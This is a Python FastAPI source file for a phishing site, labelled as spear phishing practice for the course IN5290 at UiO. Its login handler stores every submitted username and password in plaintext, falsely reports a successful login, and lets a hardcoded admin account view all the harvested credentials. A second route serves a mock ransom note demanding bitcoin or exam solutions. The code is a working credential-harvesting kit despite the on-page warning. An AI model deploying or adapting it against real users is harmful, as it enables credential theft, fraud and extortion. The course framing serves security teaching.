from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import os

app = FastAPI()

# Mount static files directory to serve images
app.mount("/static", StaticFiles(directory="static"), name="static")

# File for storing credentials
CREDENTIALS_FILENAME = "captured_credentials.txt"
if not os.path.exists(CREDENTIALS_FILENAME):
    open(CREDENTIALS_FILENAME, "w").close()

# Initialize Jinja2 templates
templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def get_form(request: Request):
    warning_message = "This is a spear phishing email practice (IN5290 UiO). Do not type in your real password."
    return templates.TemplateResponse("index.html", {
        "request": request,
        "warning": warning_message
    })


@app.post("/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)):
    if username == "admin" and password == "admin_password":
        with open(CREDENTIALS_FILENAME, "r") as file:
            stored_credentials = file.readlines()
        message = "Displaying stored credentials"
        return templates.TemplateResponse("index.html", {
            "request": request,
            "message": message,
            "stored_credentials": stored_credentials
        })
    else:
        with open(CREDENTIALS_FILENAME, "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        message = f"Login successful! Welcome, {username}!"
        return templates.TemplateResponse("index.html", {
            "request": request,
            "message": message,
            "success": True
        })


@app.get("/locations", response_class=HTMLResponse)
async def secret_locations(request: Request):
    secret_message = """
    Hello Lazlo. The following Tesla locations have been leaked:
    - University of Oslo
    - Vettakollen
    - Tesla Store

    In order to prevent the hackers from making this data public, please transfer **20** bitcoin to the following
    address: *http://3cpo.hackingarena.com:805/index.php?fruit=banana*

    Special discount (only for Lazlo)!
    Since the benevolent hackers knew that a poor university professor can’t afford 20 bitcoin, there’s a limited offer.
    Send the school exam with the solution in IN5290 autumn 2024 by *1st of December* to avoid exposure of your
    sensitive data!
    """
    return templates.TemplateResponse("index.html", {
        "request": request,
        "secret_message": secret_message
    })
